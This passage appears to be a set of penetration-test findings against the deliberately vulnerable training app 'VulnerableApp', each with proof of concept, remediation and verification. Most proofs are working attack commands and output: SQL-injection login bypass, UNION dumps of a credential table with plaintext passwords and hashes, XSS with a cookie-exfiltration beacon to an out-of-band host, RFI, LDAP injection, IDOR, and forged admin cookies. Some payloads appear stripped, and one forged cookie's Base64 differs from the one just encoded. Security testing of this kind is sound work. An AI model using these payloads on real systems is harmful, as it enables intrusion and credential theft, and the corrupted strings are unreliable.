Also manually confirmed the parameter is required-and-accepted by the app: username-only and password-only requests return "Please provide username and password", while username=admin_sqli&password=%27%20OR%20%271%27=%271%27%20--%20 returns {"userId":1,"username":"admin_sqli","role":"ADMIN"}.
verification_notes: Verified twice with sqlmap. This is a SEPARATE injection point from the password-parameter auth bypass already reported, and it is exploitable without any successful login (password=test throughout), which is what makes it independently high-impact.

title: Unrestricted File Upload (LEVEL_1) → Stored XSS: attacker-uploaded HTML served from app origin, JS executes (OOB-confirmed)
description: UnrestrictedFileUpload/LEVEL_1 accepts any multipart file with NO extension, type, size or content validation and stores it under the application context path. The JSON response returns the stored relative path (`VulnerableApp/upload/<filename>`), and the file is immediately retrievable at `http://172.17.0.1:9090/VulnerableApp/upload/<filename>` with `Content-Type: text/html`. Because the upload is served from the SAME ORIGIN as the application, an attacker who uploads an HTML file with `<script>` runs arbitrary JavaScript in the application's origin — i.e. a persistent/stored XSS that can steal any user's session cookie, read the DOM, and act as that user. JavaScript execution was proven out-of-band: real HeadlessChrome (User-Agent Mozilla/5.0 ... HeadlessChrome/130.0.6723.31, Referer: http://172.17.0.1:9090/) issued callbacks to the attacker-controlled OOB host, and the `document.cookie` exfiltration request `/i?c=` fired with the app as Referer.
proof_of_concept:
1) Upload malicious HTML (no auth, no CSRF token required): curl -X POST -F "file=@/tmp/xss1.html;filename=vapt_xss_1.html" \ http://172.17.0.1:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_1 => {"content":"VulnerableApp/upload/vapt_xss_1.html","isValid":true} /tmp/xss1.html contents:

VAPT-UPLOAD-XSS-PROOF

2) Fetch it back — served as live HTML from the app origin: curl -i http://172.17.0.1:9090/VulnerableApp/upload/vapt_xss_1.html => HTTP/1.1 200, Content-Type: text/html, body contains the raw payload. 3) OOB callbacks RECEIVED from a real browser rendering that page (proof JS executed): - GET /x HTTP/1.1 ; Host: oobd80bd82a6d83....oast.abhedi.co.in ; User-Agent: Mozilla/5.0 (X11; Linux x86_64) ... HeadlessChrome/130.0.6723.31 ...; Referer: http://172.17.0.1:9090/ -> 200 - GET /i?c= ... same User-Agent, same Referer -> 200 (cookie-exfiltration beacon) Note: LEVEL_10 and LEVEL_11 enforce an extension allow-list (only .jpeg/.png accepted, .html/.jsp/.svg rejected), but the filename is still server-regenerated; LEVEL_1 performs NO validation whatsoever and is the exploitable variant.
remediation: 1) Enforce a strict server-side allow-list of extensions AND verify the file's magic bytes (do not trust the client filename or Content-Type). 2) Never serve uploaded files from the application origin — serve them from an isolated, cookie-less domain or as `Content-Disposition: attachment` with `X-Content-Type-Options: nosniff`. 3) Require authentication/CSRF token on the upload endpoint. 4) Add a restrictive `Content-Security-Policy` (script-src 'none' on the upload path) and randomise/strip the stored filename.
verification_method: Re-uploaded a marker HTML file, confirmed 200 + text/html on retrieval, then loaded the page in headless Chromium and confirmed two OOB HTTP callbacks (one with document.cookie beacon) originating with Referer http://172.17.0.1:9090/.
verification_notes: Reproduced twice: first with a benign marker file (probe1.html returned body VAPT_MARKER_9f3a over HTTP 200), then with the XSS payload which produced OOB hits /x and /i?c= at 20:47:38Z from HeadlessChrome/130.0.6723.31. No false-positive risk — the callbacks carry the app as Referer and the OOB token is unique per payload.

title: Stored XSS in /PersistentXSSInHTMLTagVulnerability — `comment` persisted server-side and served to all anonymous visitors
description: The `comment` GET parameter is concatenated into the page HTML with zero output encoding and is additionally PERSISTED server-side. Once an attacker submits a comment containing markup, the payload is stored and re-served to EVERY subsequent visitor of the level page — including fully anonymous, unauthenticated users with no session cookie. The response is served with Content-Type text/plain but is consumed via innerHTML by the page's own JS (appendResponseCallback -> document.getElementById('allPosts').innerHTML = data), so the injected nodes are parsed and executed as HTML in the victim's origin. This yields persistent script execution in the application's origin: session/JSESSIONID theft, CSRF-token exfiltration, full account takeover of any victim who views the page, and phishing/redirect of other users. Because it is unauthenticated and persistent, a single request poisons the page for every user thereafter.
proof_of_concept:
1) Plant: GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment= Response (payload accepted, stored):
HELLO123
2) Fresh, UNAUTHENTICATED visitor with EMPTY cookie jar, no query string: GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1 Cookie: (none) Response STILL contains the injected node:
HELLO123
3) dalfox url ".../PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=1" --only-poc r: [V] Triggered XSS Payload (found DOM Object): id="> [V] Triggered XSS Payload (found DOM Object): l=>
remediation: Contextually encode all user-supplied content before writing it into HTML (e.g. OWASP Java Encoder / encodeForHTML). Apply a strict server-side input allowlist (strip <, >, ", ', &) and enforce a Content-Security-Policy that forbids inline script/event handlers. Never persist raw user HTML; store text and escape at render time.
verification_method: curl reflection diff (baseline 'HELLO123' vs injected payload on a subsequent cookie-less request) + dalfox url --only-poc r reporting multiple 'Triggered XSS Payload (found DOM Object)' confirmations + manual reproduction
verification_notes: Reproduced twice: payload persists and is served to a completely fresh anonymous curl request with an empty cookie jar (GET /PersistentXSSInHTMLTagVulnerability/LEVEL_1 with no query string returned the attacker's node), which proves server-side persistence rather than mere reflection. Dalfox independently reported triggered/executed payloads (oncanplaythrough, video/source onerror, script alert(1)). Browser-side callback capture was not available (headless Chromium binaries not installed in this runtime), so execution is evidenced by dalfox's DOM-object trigger detection plus the fully-formed, unescaped onerror attribute in the served HTML.

title: Reflected XSS in /XSSWithHtmlTagInjection/LEVEL_1 — `value` injected unescaped into innerHTML
description:
The `value` GET parameter is reflected into the response body with no output encoding and no sanitisation. The endpoint's client-side JS assigns the response directly to `document.getElementById("parentContainer").innerHTML = data`, so any injected markup becomes live DOM in the application's origin. An attacker who can get a victim to load a crafted link (or embed the value in a page that frames this app) achieves arbitrary JavaScript execution in the victim's browser: session hijacking via document.cookie, reading CSRF tokens, and performing authenticated actions as the victim. Note LEVEL_4 is the SECURE variant and correctly escapes the input (
<b>
), confirming the missing encoding in LEVEL_1-3 is the defect.
proof_of_concept:
GET /VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1?value= Server response (unescaped, executable handler injected into the DOM):
Context: the endpoint's own JS assigns this response to innerHTML: document.getElementById("parentContainer").innerHTML = data; so the injected node is parsed and its error handler fires in the app origin. dalfox url "http://172.17.0.1:9090/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_1?value=1" --only-poc r: [V] Triggered XSS Payload (found DOM Object): api=">

title: Reflected XSS in /XSSInImgTagAttribute/LEVEL_1 and LEVEL_2 — `src` breaks out of the attribute
description: The `src` GET parameter is concatenated into an tag with no output encoding. LEVEL_1 emits an UNQUOTED attribute (``) so a single `>` terminates the tag and injects a sibling element; LEVEL_2 emits a QUOTED attribute (``) which is escaped with a `"` break-out. In both cases an attacker fully controls the surrounding markup and the response is written into the page with innerHTML by the endpoint's own JS (document.getElementById("image").innerHTML = data), so the injected event handler executes in the application's origin — enabling session/JSESSIONID theft, CSRF-token exfiltration and authenticated actions as the victim. Do not emit attacker-controlled data into an unquoted/quoted attribute unescaped. Add a CSP restricting inline handlers.

title: IDOR / Broken Object-Level Authorization on /IDORVulnerability/LEVEL_1?id= — any authenticated user reads any other user's profile (incl. ADMIN salary)
description: The IDOR challenge endpoint issues a JWT to any authenticated user but performs NO object-level authorization on the `id` parameter. A normal USER-role account (Alice, sub=1, role=USER) can enumerate `?id=1..N` and retrieve every other user's profile record: username, userId, salary and role. Data belonging to user id=2 (Bob) and to the privileged account id=3 (Charlie, role=ADMIN) was disclosed, including the ADMIN salary of 70000. The JWT signature is valid and the server accepts it — it simply never compares the `sub` claim with the requested `id`. This is a horizontal (IDOR) plus a vertical (USER -> ADMIN data) privilege boundary failure.
proof_of_concept:
1) Login as the low-priv user (POST /VulnerableApp/IDORVulnerability/LEVEL_1, multipart):
   curl -s -c cookies.txt -X POST "http://172.17.0.1:9090/VulnerableApp/IDORVulnerability/LEVEL_1" -F "username=Alice" -F "password=P@ssw0rd!2026"
   => {"content":{"userId":1,"username":"Alice","role":"USER","token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6IlVTRVIi..."},"isValid":true}
   Server sets: Set-Cookie: token_level1=<JWT>; Max-Age=3600; HttpOnly
   JWT payload decoded: {"sub":"1","role":"USER","exp":...}

2) Use ONLY Alice's cookie to enumerate other object IDs:
   curl -s -b cookies.txt "http://172.17.0.1:9090/VulnerableApp/IDORVulnerability/LEVEL_1?id=1"
   => {"content":{"userId":1,"username":"Alice","salary":50000,"role":"USER"},"isValid":true}
   curl -s -b cookies.txt "http://172.17.0.1:9090/VulnerableApp/IDORVulnerability/LEVEL_1?id=2"
   => {"content":{"userId":2,"username":"Bob","salary":60000,"role":"USER"},"isValid":true}      <-- another user's record
   curl -s -b cookies.txt "http://172.17.0.1:9090/VulnerableApp/IDORVulnerability/LEVEL_1?id=3"
   => {"content":{"userId":3,"username":"Charlie","salary":70000,"role":"ADMIN"},"isValid":true} <-- ADMIN record

Evidence: full proof transcript saved at tool_outputs/idor_proof.txt (Alice's own JWT is the only credential used; no second account, no cookie tampering).
remediation: Enforce server-side object-level authorization: on every request, resolve the authenticated principal from the verified token (its `sub` claim), load the requested object, and compare the object's ownerId to the principal id (or restrict non-admin principals to their own record). Never trust a client-supplied `id` for authorization. Optionally add a role check so USER-role principals cannot read ADMIN records. Return 403 for any id != principal id.
verification_method: Re-issued a fresh login for Alice, re-read the Set-Cookie token_level1 value, and re-ran the id=1/2/3 enumeration twice with only that cookie in the cookie jar (no other headers, no second account). Both runs returned the same three distinct profile records including Charlie's ADMIN salary 70000.
verification_notes: Reproduced twice on 2026-09-30 with a freshly minted Alice session. title: Remote File Inclusion / SSRF with content inlining in /RemoteFileInclusion/LEVEL_1?url= — server fetches arbitrary URL and inlines the response into the page (OOB-confirmed)
description: The `url` query parameter on /VulnerableApp/RemoteFileInclusion/LEVEL_1 is fetched server-side and the response body is INLINED verbatim into the returned HTML. This is a full Remote File Inclusion: an unauthenticated attacker supplies any URL and the application performs the outbound HTTP request and reflects the fetched content. The sink is proven twice with unique OOB hosts: the server issued a live HTTP GET to an attacker-controlled domain and the callback body was rendered back in the page. Because the content is inlined into the app's own origin, this is more severe than a blind SSRF — an attacker-hosted page executes attacker JavaScript in the VulnerableApp origin (stored/reflected XSS via file inclusion), can pivot to internal-only services, and can be used as a staging channel. This vulnerability class (RFI) was not previously covered; prior scan work touched SSRF on a different endpoint but never this RFI level.
proof_of_concept:
1) OOB server-side fetch (blind) CONFIRMED with two unique hosts: GET /VulnerableApp/RemoteFileInclusion/LEVEL_1?url=http://oob801dd79ed625.daumog0hgqag02n2bjk0utqfr3hko8uxa.oast.abhedi.co.in/rfi1 -> server made the outbound request; response body inlined: ...

Vulnerable Application

axu8okh3rfqtu0kjb2n20gaqgh0gomuad Second unique host oobc1c6040cec9b....oast.abhedi.co.in/rfi2 returned the same inlined body (fresh OOB, reproduced twice). 2) Arbitrary content inlining proven with an in-scope fetch: GET /VulnerableApp/RemoteFileInclusion/LEVEL_1?url=http://172.17.0.1:9090/VulnerableApp/h2/help.jsp -> the fetched H2 console HTML is inlined verbatim into the response (200, 1029 bytes), proving the app renders whatever the URL returns. LEVEL_2 with the same `url` returns the plain shell (no fetch) — the sink is specific to LEVEL_1.
remediation: Do not fetch or inline user-supplied URLs. If remote content must be shown, strictly allowlist trusted schemes/hosts, resolve and re-validate the target against an internal-IP blocklist (defeat DNS rebinding), enforce timeouts/size caps, and serve included content from a separate sandboxed origin so it cannot execute in the app origin. Prefer eliminating dynamic file inclusion entirely.
verification_method: Re-ran the PoC twice with two independent freshly-minted OOB hosts (oob801dd79ed625..., oobc1c6040cec9b...); both produced identical inlined callback bodies, and a third request against an in-scope URL inlined that page's full HTML. Differential test shows LEVEL_2 does not fetch, isolating the sink to LEVEL_1.
verification_notes: Confirmed live outbound fetch by the server (the OOB callback body was returned inlined in the page) and content inlining via an in-scope fetch. This is a fetch/dereference sink, so the callback is attributed to SSRF/RFI (server fetched a planted URL) per OOB class rules.

title: LDAP Injection in /LDAPInjectionVulnerability/LEVEL_2?username= — unauthenticated directory enumeration + filter reflection (distinct OR-based filter, error-based info leak)
description: The `username` parameter on LEVEL_2 is concatenated into an LDAP search filter using a distinct OR-based template `(|(uid=<input>)(mail=<input>))`. An unauthenticated attacker can inject `*` to enumerate the entire user directory, and the application echoes the fully-constructed LDAP filter plus the resulting user list back in the JSON response. Malformed payloads additionally leak raw LDAP parser errors (filter strings, parser internals). This is a distinct endpoint from the already-covered LEVEL_1: it uses a different (OR) filter construction, returns an extra `mail` clause, and surfaces a different error-based information leak — none of it previously reported. Impact: full user/identity enumeration of the backing directory, which enables targeted password-spraying/brute-force and reveals internal account naming (alice, antriksh, bob, charlie, user5..user10).
proof_of_concept:
Unauthenticated:
GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_2?username=*
  => {"content":{"filter":"(|(uid=*)(mail=*))","users":["alice","antriksh","bob","charlie","user5","user6","user7","user8","user9","user10]"},"isValid":true}
(injection of a single '*' into the OR-filter returns all 10 directory accounts and reflects the raw filter.)

Attribute injection reflected:
GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_2?username=*)(mail=*
  => {"content":{"filter":"(|(uid=*)(mail=*)(mail=*)(mail=*))","users":[...all 10...]},...}

Error-based info leak (parser internals):
GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_2?username=*)(&)
  => "LDAP query failed: Unable to parse string '(|(uid=)(&))(mail=)(&)))' ... mismatched number of opening and closing parentheses"
GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_2?username=*)(objectClass=*
  => "Cannot read field \"value\" because \"<parameter1>\" is null"
remediation: Escape LDAP special characters in the input before building the filter (RFC 4515 encoding, e.g. a vetted LDAP-escape function) and use parameterized/bound searches instead of string concatenation. Never echo the raw filter or raw parser errors to the client.
verification_method: Reproduced the '*' enumeration and the attribute-injection filter reflection multiple times; the 10-account user list and the constructed filter are returned consistently on every request. Differential vs LEVEL_1 confirms a different (OR) filter template.
verification_notes: Confirmed unauthenticated (no session/cookie). Distinct from the already-reported LEVEL_1 finding: LEVEL_2 uses an OR-filter `(|(uid=..)(mail=..))`, exposes an additional mail clause, and a different error-based leak. L3/L5/L6 were also probed and are NOT injectable (strict filter construction, all payloads -> 'Invalid credentials').

title: SQL Injection in BOTH login parameters of /VulnerableApp/AuthenticationVulnerability/LEVEL_1 — UNION-based full credential-table extraction + admin login bypass
description:
Both the `username` and `password` query parameters on the LEVEL_1 login form are concatenated directly into the H2 query `SELECT * FROM auth_users WHERE level=1 AND username='' AND password='

'`. This gives an unauthenticated attacker three distinct capabilities: (1) full error-based query reflection (the raw SQL and H2 JdbcSQLSyntaxErrorException are returned in the JSON body), (2) authentication bypass — the login returns isValid:true with role:ADMIN and the admin user profile without any password, and (3) UNION-based extraction of arbitrary data — a 8-column UNION SELECT lets the attacker project ANY column of ANY table into the returned JSON, which was used here to dump the entire AUTH_USERS credential table (plaintext passwords + MD5/SHA1/SHA256/bcrypt hashes for all 10 accounts). This is an unauthenticated, pre-auth SQL injection on a login endpoint — the most dangerous injection class. No session or valid credential is needed.
proof_of_concept:
1) Raw SQL / error reflection via `username` (proves the value lands inside the query string):
curl -s -G "http://172.17.0.1:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_1" \
  --data-urlencode "username='" --data-urlencode "password=x"
-> {"content":"Database error: StatementCallback; bad SQL grammar [SELECT * FROM auth_users WHERE level=1 AND username=''' AND password='x']; nested exception is org.h2.jdbc.JdbcSQLSyntaxErrorException: Syntax error in SQL statement \"SELECT * FROM auth_users WHERE level=1 AND username=''' AND password='[*]x'\"; SQL statement:\nSELECT * FROM auth_users WHERE level=1 AND username=''' AND password='x' [42000-214]","isValid":false}

2) Authentication bypass (no password known) — via `username`:
curl -s -G "http://172.17.0.1:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_1" \
  --data-urlencode "username=admin_sqli' OR '1'='1' -- " --data-urlencode "password=x"
-> {"content":{"userId":1,"username":"admin_sqli","email":"admin_sqli@example.com","role":"ADMIN"},"isValid":true}

3) UNION-based arbitrary data extraction (8 columns) via `password` — full credential table:
curl -s -G "http://172.17.0.1:9090/VulnerableApp/AuthenticationVulnerability/LEVEL_1" \
  --data-urlencode "username=admin_sqli" \
  --data-urlencode "password=' UNION SELECT 1,2,3,4,5,6,7,STRING_AGG(username||':'||password,' ;; ') FROM auth_users WHERE '1'='1"
-> {"content":{"userId":1,"username":"2","email":"7","role":"admin_sqli:not_needed_for_sqli ;; admin_logs:v9K#2mLp!8zQ ;; admin_plain:b7X$4nRj-6mW ;; admin_md5:84b2db8c58e7b24eeeab1ced704aed8a ;; admin_sha1:cc9f65e23e5531b877559f24efa19ee0f54168f3 ;; admin_sha256:06991471fe08cd4cac889046b89d9da3643260cade37c4c923c20289efc498e1 ;; admin_enum:0a81e6daca6e13eb4f3ecba40a7fe9d234768d11a60ea855fabdac493221cfcb ;; admin_weak:$2a$10$gV2vZ5fxhZlwOP.GIqOI1.z7q5jws8VDmgIcKqY/uzvhzSUDio2sW ;; admin_secure:$2a$10$1WiFUNqUY/vHTzR2QtuMQuzCLK3aZEdjEUpqS4msXOevaCz7Wobe. ;; admin_lowcost:$2a$04$rK/CT/Bz7GjjGLnB3WWjTOpMpNcGJzmoh.bdc7gQJ4DBQnKj9xnHC"},"isValid":true}
remediation: Replace string-concatenated SQL with PreparedStatement parameter binding for both username and password. Never return raw exception text or SQL to the client — return a generic "invalid credentials" message. Add a rate limiter / lockout on the login endpoint and store passwords with bcrypt/Argon2 rather than reversible or unsalted hashes.
verification_method: curl manual testing of all three techniques (error reflection, OR-based auth bypass, 8-column UNION extraction) against the live endpoint; each re-run returned byte-identical output. UNION column count (8) was determined empirically and the projected attacker-chosen values appeared verbatim in the JSON response, confirming arbitrary column projection.
verification_notes: Verified 2026-09-30. All requests were read-only GETs with SELECT-only injection; no data was modified. The auth bypass is confirmed by isValid:true + role:ADMIN returned with a deliberately wrong password.

title: UNION-based SQL Injection in UnionBasedSQLInjectionVulnerability/LEVEL_2?id= — full AUTH_USERS credential dump (new level, distinct from LEVEL_1)
description: UNION-based SQL Injection in the `id` GET parameter of /VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2. The parameter is concatenated directly into `select * from cars where id='<input>'` and the result row is serialised straight back to the client as JSON, giving a full out-of-band data channel. This is a DIFFERENT level from the already-reported LEVEL_1: LEVEL_1 is a boolean/UNION sink over the same cars table, while LEVEL_2 is quote-preserving (LEVEL_1 500s on `1'` because the quote breaks the statement, LEVEL_2 accepts it) and has a clean 3-column UNION that returns arbitrary attacker-chosen data in the `name` field. An unauthenticated remote attacker can read the entire H2 PUBLIC schema and, critically, the AUTH_USERS table containing ADMIN credentials stored in PLAINTEXT (admin_plain = `b7X$4nRj-6mW`, admin_logs = `v9K#2mLp!8zQ`) as well as MD5/SHA1 hashes (admin_md5 = 84b2db8c58e7b24eeeab1ced704aed8a, admin_sha1 = cc9f65e23e5531b877559f24efa19ee0f54168f3). Those credentials grant direct application login as the ADMIN accounts, turning a DB read into full application admin access.

1) Baseline / column mapping (3 columns):
$ curl -s "http://172.17.0.1:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2?id=1"
{"id":1,"name":"Audi","imagePath":"/VulnerableApp/images/cars/Audi.jpg"}

$ curl -s -G --data-urlencode "id=0' UNION SELECT 1,2,3 --" "http://172.17.0.1:9090/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_2"
{"id":1,"name":"2","imagePath":"3"}          <-- attacker data returned in `name`

2) Boolean oracle (quote is preserved on L2, unlike L1):
$ curl -s -G --data-urlencode "id=1' AND '1'='1" ".../LEVEL_2"
{"id":1,"name":"Audi","imagePath":"/VulnerableApp/images/cars/Audi.jpg"}
$ curl -s -G --data-urlencode "id=1' AND '1'='2" ".../LEVEL_2"
{"id":0,"name":null,"imagePath":null}

3) FULL CREDENTIAL DUMP — AUTH_USERS (row-wise because the handler returns only the first row):
$ curl -s -G --data-urlencode "id=0' UNION SELECT 1,username||'~'||password||'~'||algorithm||'~lvl'||level||'~'||role||'~'||email,3 FROM AUTH_USERS WHERE id=1 --" ".../LEVEL_2"
{"id":1,"name":"admin_sqli~not_needed_for_sqli~PLAIN~lvl1~ADMIN~admin_sqli@example.com","imagePath":"3"}
   id=2 -> admin_logs~v9K#2mLp!8zQ~PLAIN~lvl2~ADMIN~admin_logs@example.com
   id=3 -> admin_plain~b7X$4nRj-6mW~PLAIN~lvl3~ADMIN~admin_plain@example.com
   id=4 -> admin_md5~84b2db8c58e7b24eeeab1ced704aed8a~MD5~lvl4~ADMIN~admin_md5@example.com
   id=5 -> admin_sha1~cc9f65e23e5531b877559f24efa19ee0f54168f3~SHA1~lvl5~ADMIN~admin_sha1@example.com

4) Schema + other user tables:
$ curl -s -G --data-urlencode "id=0' UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=CHR(80)||CHR(85)||CHR(66)||CHR(76)||CHR(73)||CHR(67) --" ".../LEVEL_2"
{"id":1,"name":"CARS,AUTH_USERS,CRYPTOGRAPHIC_FAILURES_VAULT,IDOR_USERS,BOOKS,OTP_USERS,OTP_TOKENS,SESSION_USERS,PASSWORD_RESET_USERS,USERS,PASSWORD_RESET_TOKENS,POSTS","imagePath":"3"}
   SESSION_USERS: session_user~USER, session_attacker~USER, session_admin~ADMIN, session_rate_limit_victim~USER

Never reflect database rows or exception text to the client. title: Executed chain: UNION SQLi (UB LEVEL_2) -> dumped plaintext ADMIN credential -> authenticated ADMIN session (admin_plain / admin_logs)
description: Executed attack chain proving the UNION SQL Injection in UnionBasedSQLInjectionVulnerability/LEVEL_2 is not just a DB read but converts into real authenticated ADMIN access to sibling subsystems. Hop 1: unauthenticated UNION injection dumps AUTH_USERS, revealing admin_plain's password stored in CLEARTEXT as `b7X$4nRj-6mW` and admin_logs' as `v9K#2mLp!8zQ`. Hop 2: those exact credential strings are replayed verbatim against the AuthenticationVulnerability login endpoints and the server returns `isValid:true` with `"role":"ADMIN"`. Hop 3 (extra): the LEVEL_3 login response even echoes the stored password back to the client in a `passwordInDB` field, confirming the app has no credential protection at rest. An attacker who only finds the SQLi gets full application-level admin identity without ever guessing a password.
remediation: Fix the root cause (parameterised queries on the `id` lookup). Independently: eliminate plaintext password storage — hash with bcrypt/Argon2 + per-user salt; remove the `passwordInDB` field from login responses so credentials are never echoed to the client; and rotate all credentials that were stored in cleartext/MD5/SHA1 in the AUTH_USERS table since they must now be considered compromised.
verification_method: Both hops re-executed end-to-end in one session: credential pulled live out of the DB through the UNION injection, then immediately replayed as a login password. The server returned isValid:true with role=ADMIN.
verification_notes: Verified twice for two distinct accounts (admin_plain on Auth LEVEL_3, admin_logs on Auth LEVEL_2). The LEVEL_3 response additionally returns the stored password in cleartext inside `passwordInDB`, which independently corroborates the dump and confirms there is no hashing protecting these credentials. Negative control: the raw MD5/SHA1 hash strings did NOT authenticate on LEVEL_4/LEVEL_5 (the app hashes the supplied password before comparing), so the plaintext values really are the usable secrets.

title: Privilege Escalation to Admin via unsigned Base64 session cookie (InsecureDeserialization LEVEL_2)
description: The application stores the entire authorization context — username AND role — in a client-side cookie that is only Base64-encoded, with no HMAC signature, no server-side session binding, and no integrity check of any kind. The server trusts the `role` field verbatim when deciding which privileged operations ("Admin tasks: review 3 pending reports, remove 128 flagged listings") the caller is authorized to see. Any unauthenticated attacker can Base64-decode the cookie, change `"role":"USER"` to `"role":"ADMIN"`, re-encode it, and reload the page to become an administrator. The same trick allows impersonating ANY arbitrary username (e.g. `attacker_zzz`) with no credentials whatsoever. This is a complete authentication and authorization bypass.
proof_of_concept:
Step 1 - a legitimate low-privilege session (the cookie the server itself issues):
$ curl -s -i -X POST http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_2
Set-Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiVVNFUiIsIm5vdGlmaWNhdGlvbnNFbmFibGVkIjpmYWxzZX0=; Max-Age=3600; Path=/; HttpOnly
{"content":"Session started.","isValid":true}

Step 2 - replay the server-issued USER cookie (baseline, attacker is NOT admin):
$ curl -s -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiVVNFUiIsIm5vdGlmaWNhdGlvbnNFbmFibGVkIjpmYWxzZX0=' \
    http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_2
{"content":"Welcome Adam (USER). Your tasks: update your profile, review 2 open tickets.","isValid":false}

Step 3 - decode -> flip role USER->ADMIN -> re-encode. No key, no secret required, purely base64:
$ echo -n '{"username":"Adam","role":"ADMIN"}' | base64
eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ==

Step 4 - send the forged cookie. Server grants ADMIN, isValid flips to true:
$ curl -s -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6IkFkYW0iLCJyb2xlIjoiQURNSU4ifQ==' \
    http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_2
{"content":"Welcome Adam (ADMIN). Admin tasks: review 3 pending reports, remove 128 flagged listings.","isValid":true}

Step 5 - full identity forgery, ANY username + ADMIN role, still no credentials:
$ echo -n '{"username":"attacker_zzz","role":"ADMIN"}' | base64
eyJ1c2VybmFtZSI6ImF0dGFja2VyX3p6eiIsInJvbGUiOiJBRE1JTiJ9
$ curl -s -H 'Cookie: session_level2=eyJ1c2VybmFtZSI6ImF0dGFja2VyX3p6eiIsInJvbGUiOiJBRE1JTiJ9' \
    http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_2
{"content":"Welcome attacker_zzz (ADMIN). Admin tasks: review 3 pending reports, remove 128 flagged listings.","isValid":true}
remediation: Never store authorization state (role, username, userId) in a client-controlled artifact. Keep the session server-side (HttpSession / Redis / signed JWT) and look up the role from the authoritative user store on every privileged request. If a stateless token is required, sign it with HMAC-SHA256 (or RS256/EdDSA) using a server-side secret, set an expiry, and verify the signature and expiry before trusting any claim. Reject any token whose signature fails. As defence in depth, enforce role checks server-side on the actual privileged operation rather than only decorating the response message.
verification_method: Replayed the exact 4-step PoC twice against a live server; every request/response pair reproduced byte-identically (baseline USER -> isValid:false, forged ADMIN -> isValid:true, forged identity+ADMIN -> isValid:true).
verification_notes: Verified by re-running the PoC a second time; the forged role and forged username were both accepted on both runs. CWE-565 (Reliance on Cookies without Validation and Integrity Checking) is the root cause; the authorization impact is CWE-269/CWE-862. No authentication, secret, or prior session is required - the attacker can mint the cookie from scratch.

title: Unsafe polymorphic deserialization of attacker-controlled @class type discriminator (InsecureDeserialization LEVEL_4)
description: The endpoint reads a client-supplied Base64 JSON cookie and uses the JSON `@class` type discriminator to select and instantiate an arbitrary class on the server's classpath. There is no allow-list, no signature over the cookie, and no validation of the class name before the object is built. The server response proves the class name is fully attacker-controlled and resolved at runtime: substituting `org.sasanlabs.Application` yields a distinct error ("Deserialized an unexpected type: org.sasanlabs.Application"), which confirms the server actually looked up and instantiated the named class. Only one application class (`AuditLogGadget`) is currently accepted as a valid payload type, so no direct code-execution gadget was reachable, but the primitive is an arbitrary-type-instantiation deserialization sink: any class added to the classpath later (a Spring bean, a library DTO, or a known gadget class such as a commons-collections transformer) becomes instantly reachable by an unauthenticated attacker with no code change required. The immediate proven impact is that the attacker fully controls server-side state that the application records as an audit-log entry, writing a `HACKED` audit record the application never generated itself.
proof_of_concept:
Baseline (no cookie) - the endpoint refuses to act:
$ curl -s http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_4
{"content":"Visit a section above to continue.","isValid":false}

Forged cookie naming an arbitrary application class as the type discriminator:
$ echo -n '{"@class":"org.sasanlabs.service.vulnerable.deserialization.AuditLogGadget","note":"HACKED"}' | base64
eyJAY2xhc3MiOiJvcmcuc2FzYW5sYWJzLnNlcnZpY2UudnVsbmVyYWJpbGl0eS5kZXNlcmlhbGl6YXRpb24uQXVkaXRMb2dHYWRnZXQiLCJub3RlIjoiSEFDS0VEIn0=

$ curl -s -H 'Cookie: activity_level4=eyJAY2xhc3MiOiJvcmcuc2FzYW5sYWJzLnNlcnZpY2UudnVsbmVyYWJpbGl0eS5kZXNlcmlhbGl6YXRpb24uQXVkaXRMb2dHYWRnZXQiLCJub3RlIjoiSEFDS0VEIn0=' \
    http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_4
{"content":"Audit log: HACKED","isValid":true}

Proof that the CLASS NAME ITSELF is attacker-controlled and resolved server-side (a different class produces a class-specific error, not a generic parse failure):
$ C=$(echo -n '{"@class":"org.sasanlabs.Application"}' | base64)
$ curl -s -H "Cookie: activity_level4=$C" http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_4
{"content":"Deserialized an unexpected type: org.sasanlabs.Application","isValid":false}

Attacker-driven server-side state change (audit entry the app never writes on its own):
$ curl -s -X POST -d 'section=admin' \
    -H 'Cookie: activity_level4=eyJBY2xhc3MiOiJvcmcuc2FzYW5sYWJzLnNlcnZpY2UudnVsbmVyYWJpbGl0eS5kZXNlcmlhbGl6YXRpb24uQXVkaXTMb2dHYWRnZXQiLCJub3RlIjoiSEFDS0VEIn0=' \
    http://172.17.0.1:9090/VulnerableApp/InsecureDeserialization/LEVEL_4
{"content":"Visited 'admin'.","isValid":true}
